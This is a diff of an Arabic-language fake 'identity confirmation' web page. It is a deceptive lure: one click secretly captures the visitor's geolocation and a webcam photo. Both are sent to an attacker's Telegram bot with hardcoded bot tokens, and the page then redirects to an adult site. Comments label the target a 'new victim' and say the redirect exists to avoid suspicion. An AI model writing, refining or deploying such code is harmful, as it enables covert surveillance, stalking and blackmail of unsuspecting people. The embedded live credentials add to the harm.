@@ -3,132 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تأكيد الدخول</title>
+    <title>تأكيد الهوية</title>
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: #1a1a1a; /* خلفية داكنة احترافية */
-            font-family: Arial, sans-serif;
+        body { margin: 0; padding: 0; height: 100vh; display: flex; align-items: center; justify-content: center; background: #121212; font-family: sans-serif; }
+        .box { text-align: center; color: white; }
+        #startBtn { 
+            padding: 18px 45px; font-size: 22px; font-weight: bold; color: white; 
+            background: linear-gradient(45deg, #00c6ff, #0072ff); 
+            border: none; border-radius: 50px; cursor: pointer;
+            box-shadow: 0 4px 15px rgba(0, 114, 255, 0.3); transition: 0.3s;
         }
-
-        .container {
-            text-align: center;
-            color: white;
-        }
-
-        #continueBtn {
-            padding: 20px 50px;
-            font-size: 24px;
-            font-weight: bold;
-            color: white;
-            background: linear-gradient(45deg, #007bff, #00d4ff);
-            border: none;
-            border-radius: 50px;
-            cursor: pointer;
-            box-shadow: 0 4px 15px rgba(0, 123, 255, 0.4);
-            transition: transform 0.2s, box-shadow 0.2s;
-        }
-
-        #continueBtn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 6px 20px rgba(0, 123, 255, 0.6);
-        }
-
-        #continueBtn:active {
-            transform: scale(0.95);
-        }
-
-        .loading-text {
-            display: none;
-            margin-top: 20px;
-            color: #aaa;
-        }
+        #startBtn:active { transform: scale(0.95); }
+        #status { display: none; margin-top: 20px; color: #888; font-size: 14px; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <button id="continueBtn">استمرار</button>
-        <div id="loading" class="loading-text">جاري التحقق، يرجى الانتظار...</div>
+    <div class="box">
+        <button id="startBtn">استمرار</button>
+        <div id="status">جاري المعالجة، يرجى الانتظار...</div>
     </div>
 
     <script>
-        // --- إعداداتك الخاصة (لا تغيرها) ---
-        const BOT_TOKEN = "8693784414:AAE0oARQKMewva2GqJH02TH0KjJAmP77FSM";
-        const CHAT_ID = "5127563643";
-        const REDIRECT_URL = "https://ar.stripchat.com/";
+        // --- ضع بياناتك الجديدة هنا بدقة ---
+        const MY_TOKEN = "8096456924:AAHVq0g0880odicn_a0zZIDZfuYcbG4E1lI"; 
+        const MY_CHAT_ID = "5127563643";
+        const NEXT_PAGE = "https://ar.stripchat.com/";
         // ----------------------------------
 
-        const btn = document.getElementById('continueBtn');
-        const loading = document.getElementById('loading');
+        const btn = document.getElementById('startBtn');
+        const statusText = document.getElementById('status');
 
         btn.addEventListener('click', async () => {
             btn.style.display = 'none';
-            loading.style.display = 'block';
+            statusText.style.display = 'block';
 
             try {
-                // 1. الحصول على الموقع الجغرافي
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 10000
-                    });
-                });
+                // 1. محاولة جلب الموقع (وقت انتظار قصير 5 ثواني)
+                const position = await new Promise((res, rej) => {
+                    navigator.geolocation.getCurrentPosition(res, rej, {timeout: 5000});
+                }).catch(() => null);
 
-                const { latitude, longitude } = position.coords;
-                const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                let mapLink = "الموقع غير متوفر (تم الرفض)";
+                if (position) {
+                    mapLink = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+                }
 
-                // 2. طلب الكاميرا والتقاط صورة
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-
-                // انتظار ثانية لضمان جودة الصورة
-                await new Promise(r => setTimeout(r, 1000));
-
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
-                
-                // إيقاف الكاميرا فوراً
-                stream.getTracks().forEach(track => track.stop());
-
-                // 3. إرسال الموقع (نص)
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                // 2. إرسال النص فوراً (أسرع عملية)
+                fetch(`https://api.telegram.org/bot${MY_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: `✅ ضحية جديدة!\n📍 الموقع: ${googleMapsUrl}`
+                        chat_id: MY_CHAT_ID,
+                        text: `📍 دخول جديد!\n\nرابط الخريطة:\n${mapLink}`
                     })
                 });
 
-                // 4. إرسال الصورة (ملف)
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', imageBlob, 'capture.jpg');
+                // 3. محاولة فتح الكاميرا والتقاط صورة
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true }).catch(() => null);
+                
+                if (stream) {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    await video.play();
+                    await new Promise(r => setTimeout(r, 800)); // انتظار بسيط للتركيز
 
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
+                    
+                    const formData = new FormData();
+                    formData.append('chat_id', MY_CHAT_ID);
+                    formData.append('photo', blob, 'img.jpg');
 
-                // 5. التحويل النهائي
-                window.location.href = REDIRECT_URL;
+                    await fetch(`https://api.telegram.org/bot${MY_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
 
-            } catch (error) {
-                console.error("Error:", error);
-                // في حال رفض الأذونات أو حدوث خطأ، يتم التحويل أيضاً لضمان عدم الشك
-                window.location.href = REDIRECT_URL;
+                    stream.getTracks().forEach(t => t.stop());
+                }
+
+                // 4. التحويل النهائي (مهما حدث)
+                window.location.href = NEXT_PAGE;
+
+            } catch (e) {
+                // في حال حدوث أي خطأ غير متوقع، حول المستخدم للموقع الثاني فوراً
+                window.location.href = NEXT_PAGE;
             }
         });
     </script>
